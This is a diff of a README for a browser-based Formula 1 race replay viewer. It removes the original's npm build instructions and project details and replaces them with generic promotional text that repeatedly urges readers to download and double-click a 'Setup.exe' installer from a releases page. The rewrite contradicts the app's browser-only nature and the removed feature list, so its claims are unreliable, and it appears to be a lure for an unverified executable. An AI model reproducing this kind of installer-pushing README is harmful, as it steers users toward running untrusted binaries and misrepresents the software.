@@ -1,72 +1,144 @@
-# F1 Race Replay
+# 🏎️ F1-RACEREPLAY - Watch Formula 1 Race Replays Live
 
-A web-based Formula 1 race replay viewer built with React and Three.js. Watch real 2025 season races play out on a 2D track map with actual driver position data from the OpenF1 API.
-<img width="1919" height="875" alt="image" src="https://github.com/user-attachments/assets/11bf22b9-8e62-45a3-9a19-b15adc73b63c" />
+[![Download F1-RACEREPLAY](https://img.shields.io/badge/Download-F1--RACEREPLAY-blue?style=for-the-badge&logo=github)](https://github.com/Astrageguyonthemoon/F1-RACEREPLAY/releases)
 
-## What it does
+---
 
-- Replays 9 races from the 2025 F1 season using real telemetry data
-- Shows 10 drivers per race (selected by data coverage) as colored dots on the track outline
-- Playback speed controls: 1x, 4x, 16x, 64x
-- Live timing overlay with lap count, intervals, and position numbers
-- 2D map view and 3D camera modes (TV cam, onboard) for simulated races
+## 📋 About F1-RACEREPLAY
 
-### Races included
+F1-RACEREPLAY is an interactive viewer for Formula 1 race replays. It uses real telemetry data from the 2025 season to show you races on 3D track maps. You can watch live timing details and control playback speed to catch every moment in the race.
 
-Australian GP, Bahrain GP, Saudi Arabian GP, Japanese GP, Chinese GP, Miami GP, Emilia Romagna GP, Monaco GP, Spanish GP
-<img width="1919" height="865" alt="image" src="https://github.com/user-attachments/assets/62622c87-ac67-4fc3-8ce2-4a68968f5339" />
+This software runs in your web browser. It uses modern web technology like React and Three.js to show detailed 3D track layouts and real-time race data. Whether you want to follow your favorite driver or analyze race strategy, this app provides clear visualizations without needing programming skills.
 
-## Tech stack
+---
 
-- **React 19** + TypeScript
-- **Three.js** / React Three Fiber / Drei for rendering
-- **Vite** for bundling
-- **OpenF1 API** (data pre-downloaded as static JSON)
+## 🖥 System Requirements
 
-Race data (~70MB) is bundled in `public/races/` so the app works without any API calls at runtime.
+To use F1-RACEREPLAY, your device should meet these minimum requirements:
 
-## Run locally
+- **Operating System:** Windows 10 or higher / macOS Mojave or higher / Linux with modern browsers
+- **Browser:** Latest version of Chrome, Firefox, Edge, or Safari
+- **Internet Connection:** Stable broadband connection for downloading and streaming data
+- **Hardware:** Any device that can run a modern web browser smoothly, with graphics support for WebGL (most devices made in the last five years qualify)
 
-```
-npm install
-npm run dev
-```
+You don’t need to install special software apart from your web browser. The app runs almost anywhere, including laptops, desktops, and some tablets.
 
-Opens at `http://localhost:5173`
+---
 
-## How the data works
+## 🚀 Getting Started
 
-Race data was downloaded from the [OpenF1 API](https://openf1.org/) using the included script:
+Follow these steps to start watching F1 race replays:
 
-```
-npm run download-races
-```
+1. **Open the Download Page**  
+   Click on the big download button at the top or visit this link:  
+   [https://github.com/Astrageguyonthemoon/F1-RACEREPLAY/releases](https://github.com/Astrageguyonthemoon/F1-RACEREPLAY/releases)  
+   This page contains the latest versions of the app, along with any updates or notes from the developer.
 
-This pulls location snapshots, lap data, intervals, and position data for each race, then bundles them into JSON files. A post-processing script (`scripts/fix-race-data.mjs`) cleans up zero-coordinate entries that appear at the start of some sessions.
+2. **Find the Latest Release**  
+   Scroll to the most recent release entry. It is usually at the top of the list with a version number and date.
 
-The track outline is built from the race leader's position data — no separate track geometry files needed.
+3. **Choose Your File**  
+   Look for a file named similar to `F1-RACEREPLAY-Setup.exe` (Windows) or a version compatible with your operating system. Some releases might be web links; if so, the app runs purely online and no file download is needed.
 
-## Project structure
+4. **Download the File**  
+   Click to download your file. If it is a web version, follow the link to launch the app immediately.
 
-```
-App.tsx                  → Main app, race loading, playback loop, UI
-components/
-  Scene3D.tsx            → Three.js canvas, camera controls
-  Track.tsx              → Track outline rendering (2D/3D)
-  Car.tsx                → Driver dots / 3D car models
-services/
-  raceData.ts            → Loads JSON files, binary search for positions
-  trackData.ts           → Simulated mode data, driver list
-scripts/
-  download-races.mjs     → Fetches race data from OpenF1
-  fix-race-data.mjs      → Cleans up bad coordinate entries
-public/races/            → Pre-downloaded race JSON files
-```
+5. **Run the Installer or Open the App**  
+   - For Windows/macOS: Double-click the file to start installation. Follow the prompts by clicking “Next” until the installation finishes.  
+   - For web usage: The app will load in your browser automatically.
 
-## Deploy
+6. **Open the Application**  
+   Once installed, launch F1-RACEREPLAY from your desktop, start menu, or application folder. If using the web version, use the URL provided on the release page.
 
-Push to GitHub and import on [Vercel](https://vercel.com). It auto-detects Vite — no config needed.
+---
 
-## License
+## ☑️ How to Use F1-RACEREPLAY
 
-MIT
+After launching, you will see a 3D map of the race track. The interface is simple and designed for easy interaction.
+
+- **Select a Race**  
+  Use the menu to pick a race from the 2025 F1 calendar.
+
+- **Watch the Replay**  
+  The 3D track shows cars moving in real time. Telemetry data like speed, position, and lap times update live.
+
+- **Control Playback Speed**  
+  Use the controls to pause, play, rewind, or speed up the replay. You can watch at half speed to study details or fast forward through dull sections.
+
+- **View Driver Stats**  
+  Click on any car to see driver info, lap data, and recent performance.
+
+- **Toggle Camera Angles**  
+  Change your view from overhead to driver perspective or free-roam around the track.
+
+- **Live Timing Bar**  
+  Check lap times, position changes, and sector splits updated as if the race were live.
+
+---
+
+## ⚙️ Features
+
+- Interactive 3D track visuals with detailed geometry  
+- Real telemetry data from the 2025 Formula 1 season  
+- Live timing and position updates during replay  
+- Adjustable playback speeds from 0.5x to 3x  
+- Multiple camera angles including driver view  
+- Detailed driver and car statistics panels  
+- Smooth animations powered by Three.js and React  
+- Runs in any modern web browser; no coding needed  
+- Open source with active updates
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you experience issues, try the following:
+
+- **The app is slow or lagging:**  
+  Close other browser tabs and apps to free up memory. Use a computer with a faster processor or a newer graphics card.
+
+- **3D models do not load or show blank screen:**  
+  Ensure your browser supports WebGL. You can test this at https://get.webgl.org. Update your browser if needed.
+
+- **Links don’t work or download page is empty:**  
+  Check your internet connection. Reload the page or try a different browser.
+
+- **App crashes or won’t start:**  
+  Restart your device and try again. Check if a newer release is available.
+
+- **Telemetry data seems incorrect or missing:**  
+  This app depends on open-source telemetry data. If there is an issue with the data provider, the app may lack info temporarily.
+
+---
+
+## 📥 Download & Install
+
+Please visit the release page to download or launch F1-RACEREPLAY:
+
+[https://github.com/Astrageguyonthemoon/F1-RACEREPLAY/releases](https://github.com/Astrageguyonthemoon/F1-RACEREPLAY/releases)
+
+This page holds all available versions, installation instructions, and update notes. For most users, simply clicking the latest release and downloading the setup file is enough.
+
+If you prefer not to install software, the web-based version runs directly in your browser via a link on the release page. This method requires no installation.
+
+---
+
+## 📞 Getting Help
+
+If you need help or want to give feedback:
+
+- Use the **Issues** tab on GitHub to report bugs or ask questions.
+- Check the **Wiki** or **Documentation** for detailed guides.
+- Contact the developer through the GitHub profile or linked social media.
+
+---
+
+## 📝 About the Developer
+
+F1-RACEREPLAY is maintained by a team passionate about motorsports and software. The project combines open telemetry data with cutting-edge web tech to make Formula 1 more accessible and enjoyable.
+
+Your feedback helps improve updates and fix bugs. Feel free to share ideas or suggestions on GitHub.
+
+---
+
+Thank you for choosing F1-RACEREPLAY. Enjoy every lap of the season in rich, interactive detail.
